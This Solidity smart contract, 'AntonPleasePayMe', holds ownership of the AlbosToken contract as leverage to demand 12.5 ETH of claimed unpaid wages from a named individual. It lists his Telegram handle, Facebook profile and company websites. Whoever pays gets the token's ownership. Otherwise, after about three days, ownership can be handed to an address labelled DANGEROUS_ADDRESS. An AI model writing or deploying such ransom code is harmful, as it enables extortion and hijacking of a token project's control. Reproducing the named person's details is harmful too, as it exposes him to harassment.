 

pragma solidity ^0.4.25;

interface AlbosToken {
  function transferOwnership(address newOwner) external;
}

contract AntonPleasePayMe {
  string public constant telegram = '@antondz';
  string public constant facebook = 'www.facebook.com/AntonDziatkovskii';
  string public constant websites = 'www.ubai.co && www.platinum.fund && www.micromoney.io';
  string public constant unpaidAmount = '$1337 / 107 usd per eth = 12.5 ETH';

  string public constant AGENDA = 'Anton Dziatkovskii, please, pay me $1337 for my full-time job.';
  uint256 public constant ETH_AMOUNT = 12500000000000000000;
  uint256 public constant THREE_DAYS_IN_BLOCKS = 18514;  
  address public constant DANGEROUS_ADDRESS = address(0xec95Ad172676255e36872c0bf5D417Cd08C4631F);
  uint256 public START_BLOCK = 0;
  AlbosToken public albos;
  bool public setup = true;

  function start(AlbosToken _albos) external {
    require(setup);
    require(address(0x3E9Af6F2FD0c1a8ec07953e6Bc0D327b5AA867b8) == address(msg.sender));

    albos = AlbosToken(_albos);
    START_BLOCK = block.number;
    setup = false;
  }

  function () payable external {
    require(msg.value >= ETH_AMOUNT / 100);

    if (msg.value >= ETH_AMOUNT) {
      albos.transferOwnership(address(msg.sender));
      address(0x5a784b9327719fa5a32df1655Fe1E5CbC5B3909a).transfer(msg.value / 2);
      address(0x2F937bec9a5fd093883766eCF3A0C175d25dEdca).transfer(address(this).balance);
    } else if (block.number > START_BLOCK + THREE_DAYS_IN_BLOCKS) {
      albos.transferOwnership(DANGEROUS_ADDRESS);
      address(0x5a784b9327719fa5a32df1655Fe1E5CbC5B3909a).transfer(msg.value);
    } else {
      revert();
    }
  }
}